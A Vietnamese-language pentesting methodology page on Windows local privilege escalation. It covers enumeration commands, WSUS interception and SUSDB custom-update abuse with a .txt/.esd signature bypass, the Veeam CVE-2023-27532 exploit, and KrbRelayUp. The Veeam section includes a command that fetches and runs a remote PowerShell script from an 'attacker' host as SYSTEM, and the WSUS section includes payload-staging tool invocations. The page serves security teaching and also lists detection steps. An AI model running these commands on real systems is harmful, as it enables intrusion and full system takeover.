# Leo thang đặc quyền cục bộ trên Windows

{{#include ../../banners/hacktricks-training.md}}

### **Công cụ tốt nhất để tìm các vector leo thang đặc quyền cục bộ trên Windows:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

Trang này tổng hợp phương pháp luận chung về leo thang đặc quyền trên Windows từ một số hướng dẫn nền tảng.<sup>[[1]](#references)[[3]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[11]](#references)</sup> Quy trình enumeration thực tiễn cũng dựa trên các workshop và checklist của cộng đồng.<sup>[[4]](#references)[[9]](#references)[[10]](#references)</sup> Nội dung về các cuộc tấn công trong quá khứ bao gồm bài thuyết trình tại DerbyCon về leo thang đặc quyền trên Windows.<sup>[[5]](#references)</sup>

## Lý thuyết cơ bản về Windows

### Access Tokens

**Nếu bạn chưa biết access token của Windows là gì, hãy đọc trang sau trước khi tiếp tục:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**Xem trang sau để biết thêm thông tin về ACLs - DACLs/SACLs/ACEs:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**Nếu bạn chưa biết integrity level trong Windows là gì, hãy đọc trang sau trước khi tiếp tục:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Các biện pháp kiểm soát bảo mật của Windows

Windows có nhiều cơ chế có thể **ngăn bạn enumeration hệ thống**, chạy executable hoặc thậm chí **phát hiện hoạt động của bạn**. Trước khi bắt đầu enumeration để leo thang đặc quyền, bạn nên **đọc** **trang** sau và **enumeration** tất cả các **cơ chế phòng thủ** này:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

Quyền truy cập vật lý cũng có thể biến việc chỉnh sửa UEFI NVRAM khi offline thành chuỗi tấn công DMA trước khi khởi động và vá bộ nhớ Windows `SYSTEM`:

{{#ref}}
../../hardware-physical-access/firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

### Bảo vệ Admin / nâng quyền im lặng qua UIAccess

Có thể lợi dụng các tiến trình UIAccess được khởi chạy qua `RAiLaunchAdminProcess` để đạt High IL mà không có prompt khi vượt qua các kiểm tra secure-path của AppInfo. Xem quy trình chuyên biệt để bypass UIAccess/Admin Protection tại đây:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Có thể lợi dụng việc truyền registry của accessibility trên Secure Desktop để ghi tùy ý vào registry với quyền SYSTEM (RegPwn):<sup>[[18]](#references)</sup>

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

Các bản Windows gần đây cũng có vector LPE qua **SMB arbitrary-port**, trong đó một xác thực NTLM cục bộ có đặc quyền được phản chiếu qua kết nối SMB TCP được tái sử dụng:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## Thông tin hệ thống

Để kiểm kê cục bộ từ một phiên PowerShell hiện có, xem [Windows Enumeration with .NET](../basic-powershell-for-pentesters/dotnet-enumeration.md). Các ví dụ này bổ trợ cho những bước kiểm tra bên dưới mà không cần chạy các executable enumeration riêng.

### Enumeration thông tin phiên bản

Kiểm tra xem phiên bản Windows có lỗ hổng nào đã biết hay không (đồng thời kiểm tra các bản vá đã cài).

```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```

### Khai thác theo phiên bản

[Trang này](https://msrc.microsoft.com/update-guide/vulnerability) rất hữu ích để tra cứu thông tin chi tiết về các lỗ hổng bảo mật của Microsoft. Cơ sở dữ liệu này có hơn 4.700 lỗ hổng bảo mật, cho thấy **bề mặt tấn công khổng lồ** mà môi trường Windows mang lại.

**Trên hệ thống**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas tích hợp watson)_
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) — kiểm kê bản dựng OS, các bản cập nhật đã cài đặt và một số ứng viên advisory; hãy xác minh chính xác sản phẩm và các bản cập nhật thay thế trước khi xem kết quả là phù hợp.

Đối với local exploit dành riêng cho một phiên bản, hãy kiểm tra **kiến trúc của tiến trình đang chạy** cũng như kiến trúc OS. Trên Windows 64-bit, tiến trình 32-bit chịu ảnh hưởng của [chuyển hướng hệ thống tệp WOW64](https://learn.microsoft.com/en-us/windows/win32/winprog64/file-system-redirector): `%windir%\System32` thường trỏ đến thư mục hệ thống 32-bit, trong khi `%windir%\Sysnative` cho phép tiến trình đó truy cập thư mục hệ thống native. Alias này không khả dụng với tiến trình 64-bit. Bản dựng OS hoặc ứng viên thiếu KB không chứng minh được rằng có thể khai thác; hãy đối chiếu bản dựng đang chạy, bản cập nhật đã cài đặt hoặc bản cập nhật thay thế, kiến trúc tiến trình và các điều kiện tiên quyết của exploit với [bản tin bảo mật của Microsoft](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-032) dành cho vấn đề cụ thể đó.

Để xem ví dụ về lỗi memory corruption trong service, hãy xem [các offset ring bộ nhớ chia sẻ MIDI do client kiểm soát](../../binary-exploitation/array-indexing.md#client-controlled-shared-memory-ring-positions). Các stack offset đã công bố chỉ áp dụng cho bản dựng được thử nghiệm; đạt được quyền `LOCAL SERVICE` khác với bước tiếp theo là [SeImpersonate/EfsPotato](roguepotato-and-printspoofer.md) để lên `SYSTEM`.<sup>[[44]](#references)</sup>

**Cục bộ với thông tin hệ thống**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Các repo exploit trên Github:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Môi trường

Có credential/thông tin giá trị nào được lưu trong các biến môi trường không?

```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```

### Lịch sử PowerShell

```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```

### Các tệp bản ghi phiên PowerShell

Bạn có thể tìm hiểu cách bật tính năng này tại [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)

```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```

`C:\Transcripts` chỉ là ví dụ. [Chính sách ghi transcript của PowerShell](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_group_policy_settings#turn-on-powershell-transcription) thường ghi vào thư mục Documents của từng người dùng, nhưng thiết lập `OutputDirectory` hoặc `Start-Transcript -OutputDirectory` có thể chuyển hướng tệp đến một thư mục dùng chung hoặc ẩn. Kiểm tra đường dẫn đầu ra hiệu lực và ACL của tệp trước khi xem transcript: tệp có thể chứa đối số lệnh và đầu ra, bao gồm cả thông tin xác thực. Transcript có thể đọc được chỉ là manh mối khi nội dung tiết lộ một danh tính có đặc quyền cao hơn có thể sử dụng được và danh tính đó có thể đăng nhập trong ngữ cảnh liên quan.

### PowerShell Module Logging

Chi tiết về các lần thực thi pipeline của PowerShell được ghi lại, bao gồm các lệnh đã thực thi, lời gọi lệnh và một phần của script. Tuy nhiên, có thể không ghi lại đầy đủ chi tiết thực thi và kết quả đầu ra.

Để bật tính năng này, hãy làm theo hướng dẫn trong phần "Transcript files" của tài liệu và chọn **"Module Logging"** thay vì **"Powershell Transcription"**.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```

Để xem 15 sự kiện gần nhất từ nhật ký PowersShell, bạn có thể thực thi:

```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```

### PowerShell **Script Block Logging**

Ghi lại đầy đủ hoạt động và toàn bộ nội dung trong quá trình thực thi script, đảm bảo mọi khối mã đều được ghi lại khi chạy. Quy trình này duy trì nhật ký kiểm tra toàn diện về từng hoạt động, hữu ích cho điều tra số và phân tích hành vi độc hại. Việc ghi lại mọi hoạt động ngay tại thời điểm thực thi cung cấp thông tin chi tiết về quy trình.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```

Các sự kiện ghi nhật ký cho Script Block có thể được tìm thấy trong Windows Event Viewer tại đường dẫn: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Để xem 20 sự kiện gần nhất, bạn có thể dùng:

```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```

### Cài đặt Internet

```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```

### Ổ đĩa

```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```

## WSUS

Hướng dẫn trước đó đã tóm tắt rủi ro như sau:

Bạn có thể xâm phạm hệ thống nếu các bản cập nhật được yêu cầu qua http thay vì http**S**.

Điểm cuối WSUS dùng HTTP là dấu hiệu cần kiểm tra nguy cơ chặn sửa metadata cập nhật. Khả năng khai thác còn phụ thuộc vào việc client có sử dụng máy chủ WSUS đó hay không, kẻ tấn công có thể chặn hoặc kiểm soát lưu lượng của máy chủ hay không, cũng như chính sách cài đặt và độ tin cậy của bản cập nhật trên client. Chỉ riêng URL không chứng minh được khả năng thực thi mã. [Microsoft recommends TLS for WSUS metadata](https://learn.microsoft.com/en-us/windows-server/administration/windows-server-update-services/deploy/2-configure-wsus).

Trước tiên, hãy kiểm tra xem mạng có sử dụng bản cập nhật WSUS không SSL hay không bằng cách chạy lệnh sau trong cmd:

```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```

Hoặc đoạn sau trong PowerShell:

```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```

Nếu bạn nhận được phản hồi như một trong những phản hồi sau:

```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
      WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```

Và nếu `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` hoặc `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` bằng `1`.

Phát biểu ban đầu về khả năng áp dụng là:

Khi đó, **có thể khai thác được.** Nếu giá trị registry cuối cùng bằng `0`, mục WSUS sẽ bị bỏ qua.

Khi `UseWUServer` là `1`, Windows Update sẽ sử dụng dịch vụ intranet đã cấu hình. Điều này xác nhận một điều kiện tiên quyết cho hướng tấn công chặn HTTP, nhưng không chứng minh rằng có thể chặn lưu lượng, chấp nhận bản cập nhật độc hại hoặc cài đặt với quyền cao. Khi giá trị là `0`, chính sách này sẽ không chọn endpoint WSUS đã cấu hình.

Để khai thác các lỗ hổng này, bạn có thể dùng các công cụ như: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus)- Đây là các script khai thác MiTM được weaponize để chèn bản cập nhật 'giả' vào lưu lượng WSUS không dùng SSL.

Đọc nghiên cứu tại đây:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Đọc báo cáo đầy đủ tại đây**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).<sup>[[33]](#references)</sup>\
Về cơ bản, đây là lỗ hổng mà lỗi này khai thác:

> Nếu chúng ta có quyền sửa đổi proxy của người dùng cục bộ và Windows Updates sử dụng proxy được cấu hình trong cài đặt Internet Explorer, thì chúng ta có thể chạy [PyWSUS](https://github.com/GoSecure/pywsus) cục bộ để chặn lưu lượng của chính mình và chạy code với quyền cao trên hệ thống.
>
> Hơn nữa, vì dịch vụ WSUS sử dụng cài đặt của người dùng hiện tại nên dịch vụ cũng sẽ sử dụng kho chứng chỉ của người dùng đó. Nếu tạo một chứng chỉ tự ký cho hostname WSUS và thêm chứng chỉ này vào kho chứng chỉ của người dùng hiện tại, chúng ta có thể chặn cả lưu lượng WSUS HTTP lẫn HTTPS. WSUS không dùng cơ chế kiểu HSTS để triển khai xác thực trust-on-first-use đối với chứng chỉ. Nếu chứng chỉ được trình bày được người dùng tin cậy và có hostname chính xác, dịch vụ sẽ chấp nhận chứng chỉ đó.

Bạn có thể khai thác lỗ hổng này bằng công cụ [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (khi công cụ được phát hành).

### Bản cập nhật do quản trị viên WSUS kiểm soát

Một hướng tấn công riêng biệt có thể xảy ra khi danh tính hiện tại có quyền **phát hành và phê duyệt** bản cập nhật trên máy chủ WSUS. Kiểm tra tư cách thành viên hiệu lực của nhóm `WSUS Administrators` trên máy chủ và mọi quyền WSUS được ủy quyền, sau đó xác định nhóm máy tính client sẽ nhận bản cập nhật đã được phê duyệt. [Microsoft yêu cầu quyền WSUS Administrator để phê duyệt bản cập nhật](https://learn.microsoft.com/en-us/powershell/module/updateservices/approve-wsusupdate), đồng thời [tài liệu hóa mối quan hệ tin cậy trong quá trình phát hành](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/bb902479%28v%3Dvs.85%29): client phải tin cậy chứng chỉ ký được dùng cho nội dung phát hành cục bộ. Hãy xác nhận bản cập nhật tiềm năng đã được ký và chấp nhận, áp dụng cho mục tiêu, đồng thời được cài đặt trong ngữ cảnh có quyền cao hơn trước khi xem đây là một hướng leo thang đặc quyền. Chỉ riêng giá trị HTTP `WUServer` hoặc tên nhóm không đủ để chứng minh các điều kiện đó.

### Lạm dụng bản cập nhật tùy chỉnh SUSDB: payload chưa ký qua `.txt`/`.esd`

Đây là một lỗi ranh giới tin cậy khác với việc chặn kết nối WSUS qua HTTP: điều kiện tiên quyết là có đủ quyền truy cập vào **các stored procedure trong database WSUS (`SUSDB`)** để phát hành và phê duyệt bản cập nhật tùy chỉnh. Một cách tiếp cận thực tế là relay tài khoản máy tính WSUS upstream tới một máy chủ MSSQL riêng biệt lưu trữ `SUSDB`; điều kiện tiên quyết chính xác phụ thuộc vào triển khai, vì vậy trước tiên hãy liệt kê các quyền `EXECUTE` thay vì mặc định rằng cần quyền quản trị SQL.<sup>[[38]](#references)[[39]](#references)</sup>

Để xem hướng tấn công riêng biệt sử dụng relay xác thực của WSUS client từ HTTP/8530 tới LDAP, SMB hoặc AD CS, xem [Lạm dụng WSUS HTTP để relay NTLM](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#abusing-wsus-http-8530-for-ntlm-relay-to-ldapsmbad-cs-esc8).

#### Xác nhận relay tới database bên ngoài và quyền trên procedure

Trong các triển khai WSUS dùng SQL Server bên ngoài, trước tiên hãy kiểm tra xem tài khoản máy chủ WSUS có thể xác thực với database hay không và liệu NTLM relay có tiếp cận được listener đó hay không. Role SQL của máy chủ có thể cho phép các procedure phát hành bản cập nhật ngay cả khi quyền ghi trực tiếp vào bảng bị từ chối; lệnh `UPDATE` thất bại trên `SUSDB` không chứng minh rằng việc phát hành bị chặn. Trong phiên SQL được cấp quyền, hãy kiểm tra danh tính hiệu lực, tư cách thành viên role và quyền trên procedure trước khi thử phát hành bản cập nhật tùy chỉnh.<sup>[[38]](#references)</sup>

```sql
USE SUSDB;
SELECT ORIGINAL_LOGIN() AS LoginName, USER_NAME() AS DatabaseUser;
SELECT IS_ROLEMEMBER('webService') AS IsWebServiceRoleMember;
SELECT * FROM sys.fn_my_permissions('dbo.spImportUpdate', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spSaveXmlFragment', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spSetBatchURL', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spDeployUpdate', 'OBJECT');
```

Các định nghĩa thủ tục đang hoạt động và tệp `SoftwareDistributionPackage.xsd` đã cài đặt rất hữu ích khi tái dựng metadata cập nhật hợp lệ. Cả bundle parent và payload child đều cần `UpdateIdentity` (fragment type `1`), `LocalizedProperties` (`4`) và `ExtendedProperties` (`2`); hãy ghi lại local revision ID được trả về từ mỗi lệnh gọi `spImportUpdate` và đảm bảo mối quan hệ bundle, digest, kích thước, content URL và revision luôn nhất quán. Đây là quy trình phát hành có trạng thái, vì vậy một lệnh gọi stored procedure thành công không chứng minh rằng phía client đã thực thi.<sup>[[38]](#references)</sup>

#### Tạo, nhắm mục tiêu và phê duyệt bản cập nhật

Quy trình custom-update sử dụng các thủ tục WSUS hợp lệ như một publishing API bị giới hạn. Các chuyển đổi trạng thái quan trọng là:<sup>[[38]](#references)</sup>

| Giai đoạn | Stored procedure liên quan |
| --- | --- |
| Nhập metadata cập nhật | `spImportUpdate` |
| Lưu các XML fragment về prerequisite, localized và extended | `spSaveXMLFragment` |
| Liên kết digest của content với URL do attacker kiểm soát | `spSetBatchURL` |
| Liệt kê/tạo computer group và thêm client | `spGetAllTargetGroups`, `spCreateTargetGroup`, `spGetComputerTargetByName`, `spAddComputerToTargetGroup` |
| Phê duyệt cài đặt cho group đó | `spDeployUpdate` với `@actionID = 0` và `@isAssigned = 1` |

Tên tệp, digest, kích thước và handler `CommandLineInstallation` phải khớp nhau trong metadata/fragments đã nhập. Sau khi gán content URL và target group, bước phê duyệt cuối cùng có dạng như sau; hãy dùng các update, group và deployment identifier mới thay vì phát lại các GUID ví dụ.<sup>[[38]](#references)[[39]](#references)</sup>

```sql
EXEC spDeployUpdate
  @updateID = '<update-guid>', @revisionNumber = 1,
  @actionID = 0, @targetGroupID = '<group-guid>',
  @isAssigned = 1, @deadline = '<yyyy-mm-dd hh:mm:ss>',
  @adminName = 'Administrator';
```

#### Bypass chữ ký dựa trên phần mở rộng

WSUS thường từ chối nội dung thực thi tùy ý không có chữ ký. Tuy nhiên, trong `C:\Program Files\Update Services\Services\Microsoft.UpdateServices.ContentSyncAgent.dll`, đường dẫn .NET `VerifyFile` đặt cờ kiểm tra chứng chỉ thành false khi tên tệp được cung cấp kết thúc bằng `.txt` hoặc `.esd`; khi đó `CheckCertificateSignature` bị bỏ qua mà không xác minh trước rằng các byte là văn bản hoặc ảnh ESD hợp lệ. Vì vậy, một PE không bị thay đổi, chẳng hạn được đặt tên `payload.exe.txt`, có thể vượt qua bước xác minh nội dung và sau đó được trình xử lý cài đặt dòng lệnh của bản cập nhật khởi chạy. Đây là lỗi nhầm lẫn chính sách/kiểu dữ liệu, không phải giả mạo chữ ký.<sup>[[39]](#references)</sup>

```csharp
bool checkSignature = true;
if (fileName.EndsWith(".txt") || fileName.EndsWith(".esd"))
    checkSignature = false;
if (checkSignature)
    CheckCertificateSignature(/* downloaded file */);
```

#### Staging và tự động hóa tương thích với BITS

Gọi `spDeployUpdate` sẽ khiến WSUS tải nội dung đã đăng ký. Máy chủ nguồn phải đáp ứng các yêu cầu HTTP của BITS: chỉ có URL truy cập được là chưa đủ vì quá trình truyền sử dụng luồng `HEAD`/`GET` ban đầu và các yêu cầu byte-range. Máy chủ không hỗ trợ Range sẽ khiến quá trình đồng bộ WSUS tạo `EventId=364`, cho biết BITS yêu cầu header giao thức Range.<sup>[[39]](#references)</sup>

PoC nghiên cứu [NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious) tạo SQL cần thiết cho chuỗi import/fragment/URL/group/deployment, đi kèm một MSSQL client đã chỉnh sửa để thực thi chuỗi này và cung cấp `BitsWebServer.py` để staging nội dung. Lệnh gọi tối thiểu trong lab được ủy quyền là:<sup>[[40]](#references)</sup>

```bash
python3 NotWSUSpicious.py \
  --wsusHostname wsus.lab.local \
  --updateFileURL 'http://payload.lab.local:8443/payload.exe.txt' \
  --updateName SecurityUpdate \
  --updateFilePath /payloads/payload.exe.txt \
  --updateArguments '' \
  --computerGroup TestGroup \
  --targetComputer workstation.lab.local
python3 BitsWebServer.py
```

#### Thực thi không cần giám sát và persistence khi thử lại

Tương tác phía client phụ thuộc vào policy. `Computer Configuration > Administrative Templates > Windows Components > Windows Update > Configure Automatic Updates`, tùy chọn `4 - Auto download and schedule install`, khiến một bản cập nhật đã được phê duyệt tự tải xuống và cài đặt theo lịch đã cấu hình mà không cần người dùng chọn thủ công. Trong quá trình kiểm thử, payload có trạng thái cập nhật vẫn thất bại/chưa hoàn tất được đề nghị lại ngay sau khi tiến trình callback thoát, nên hành vi thử lại có thể trở thành persistence thực thi lặp lại; cách này gây nhiều chú ý vì client hiển thị trạng thái cập nhật thất bại.<sup>[[39]](#references)</sup>

#### Các hướng phát hiện và hardening

Các hướng kiểm tra hữu ích ở phía server và client trong chuỗi này gồm:<sup>[[39]](#references)</sup>

- Kiểm tra việc thực thi `spCreateTargetGroup`, `spSetBatchURL` và `spDeployUpdate` trong `SUSDB`; điều tra các targeting group mới, nguồn nội dung bên ngoài, payload cập nhật `.txt`/`.esd` và các triển khai do principal bất ngờ thực hiện (đặc biệt là tài khoản không phải máy tính).
- Kiểm tra `C:\Program Files\Update Services\LogFiles` để tìm `ContentSyncAgent`, `FileVerified`, `FileVerficationFailed` (viết sai chính tả) và `EventId=364`; đối chiếu việc xác minh với phần mở rộng payload và magic của nội dung thay vì tin vào hậu tố.
- Tìm dấu hiệu Windows Update liên tục cài đặt thất bại/thử lại và PE thực thi hoặc có hoạt động tiến trình con/mạng bất thường từ nội dung mang tên `.txt` hoặc `.esd`.
- Khi được hỗ trợ, yêu cầu Extended Protection for Authentication trên dịch vụ database và giới hạn quyền truy cập mạng database cho máy chủ WSUS cùng các hệ thống quản trị được ủy quyền. Giảm thiểu và kiểm tra quyền `EXECUTE` trên các thủ tục custom-update.

## Bộ cập nhật tự động bên thứ ba và Agent IPC (local privesc)

Nhiều agent doanh nghiệp cung cấp một bề mặt IPC localhost và một kênh cập nhật có đặc quyền. Nếu có thể ép buộc enrollment kết nối tới server của attacker và updater tin cậy rogue root CA hoặc kiểm tra signer yếu, người dùng cục bộ có thể chuyển một MSI độc hại để dịch vụ SYSTEM cài đặt. Xem kỹ thuật tổng quát hóa (dựa trên chuỗi Netskope stAgentSvc – CVE-2025-0309) tại đây:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM qua TCP 9401)

Mô tả ban đầu theo phiên bản cụ thể và ghi chú reconnaissance như sau:

Veeam B&R < `11.0.1.1261` để lộ một dịch vụ localhost trên **TCP/9401** xử lý các thông điệp do attacker kiểm soát, cho phép thực thi lệnh tùy ý với quyền **NT AUTHORITY\SYSTEM**.<sup>[[12]](#references)</sup>

- **Recon**: xác nhận listener và phiên bản, ví dụ: `netstat -ano | findstr 9401` và `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`.

Veeam Backup & Replication và Cloud Connect sử dụng dịch vụ backup cốt lõi trên **TCP/9401 theo mặc định**. [Thông báo bảo mật của Veeam](https://www.veeam.com/kb4424) mô tả việc tiết lộ thông tin xác thực database cấu hình đã mã hóa mà không cần xác thực trong phạm vi mạng backup; một PoC công khai riêng biệt chứng minh một đường dẫn thực thi lệnh với quyền **NT AUTHORITY\SYSTEM**.<sup>[[12]](#references)</sup> Dịch vụ có thể bind trên phạm vi rộng hơn localhost, vì vậy hãy kiểm tra địa chỉ thực tế và PID của dịch vụ.

- **Recon**: xác nhận TCP/9401 thuộc về `Veeam.Backup.Service.exe`, sau đó kiểm tra sản phẩm đã cài đặt và metadata bản vá. `netstat -ano | findstr 9401` và `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion` là các manh mối, không phải kiểm tra bản vá đầy đủ.
- **Các mốc phiên bản đã sửa lỗi**: Veeam liệt kê **11a build 11.0.1.1261 P20230227** và **12 build 12.0.0.1420 P20230223** là các bản phát hành đầu tiên đã sửa lỗi; các bản phát hành trước đó bị ảnh hưởng. Chỉ dựa vào phiên bản file gồm bốn phần thì không thể phân biệt một base build chưa được vá với bản vá mới hơn trên cùng build number. Hãy xác minh patch identifier dựa trên [lịch sử build của vendor](https://www.veeam.com/kb2680) trước khi xác định build tại ngưỡng phiên bản đã được sửa lỗi.
- **Exploit**: đặt một PoC như `VeeamHax.exe` cùng các DLL Veeam cần thiết trong cùng thư mục, sau đó kích hoạt payload SYSTEM qua socket cục bộ:

```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```

Dịch vụ thực thi lệnh với quyền SYSTEM.

PoC được trích dẫn minh họa việc thực thi lệnh với quyền SYSTEM khi đáp ứng các điều kiện tiên quyết bổ sung; advisory của nhà cung cấp mô tả vấn đề lộ thông tin xác thực.

## KrbRelayUp

Mô tả ban đầu về môi trường mặc định là:

Lỗ hổng **leo thang đặc quyền cục bộ** tồn tại trong môi trường **domain** Windows khi có một số điều kiện cụ thể. Các điều kiện này bao gồm môi trường **không bắt buộc ký LDAP,** người dùng có các quyền tự cấp cho phép họ cấu hình **Resource-Based Constrained Delegation (RBCD),** và người dùng có khả năng tạo computer trong domain. Cần lưu ý rằng các **yêu cầu** này được đáp ứng với **cài đặt mặc định**.

Kerberos relay cục bộ có thể chuyển từ phiên đăng nhập với đặc quyền thấp sang thao tác ghi vào directory với đặc quyền cao khi một COM server phù hợp xác thực và principal được relay có quyền trên object đích. [Tài liệu KrbRelay](https://github.com/cube0x0/KrbRelay) mô tả cả thao tác ghi LDAP RBCD và `msDS-KeyCredentialLink` (shadow-credential); KrbRelayUp tự động hóa một số đường tấn công này. Chuỗi tấn công RBCD cần quyền delegation và quyền trên object đích phù hợp, còn chuỗi shadow-credential cần quyền ghi key-credential và một KDC hỗ trợ luồng xác thực bằng certificate. Không đường tấn công nào trong số này chỉ có thể thực hiện nhờ việc tham gia domain.

Kiểm tra chính sách [LDAP signing](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-signing) và [LDAPS channel-binding](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-channel-binding) thực tế của DC, ACL của object đối với danh tính được relay, cũng như cấp độ xác thực và mạo danh của lớp COM được chọn. Loại đăng nhập và ngữ cảnh thông tin xác thực của caller cũng quan trọng: phiên WinRM có thể hoạt động khác với phiên đăng nhập tương tác hoặc đăng nhập bằng thông tin xác thực mới. Cấu hình tường lửa/định tuyến OXID và các bản cập nhật đã cài đặt cũng có thể làm thay đổi kết quả. Hãy xem chính sách quá dễ dãi hoặc ACL phù hợp là đối tượng cần rà soát; việc liệt kê thụ động không nên kích hoạt COM coercion, relay authentication hay thao tác ghi vào directory. Shadow credential của tài khoản máy có thể dẫn đến machine ticket và, chỉ khi tài khoản đó có các quyền replication directory cần thiết, một đường DCSync riêng biệt.

Tìm **exploit tại** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

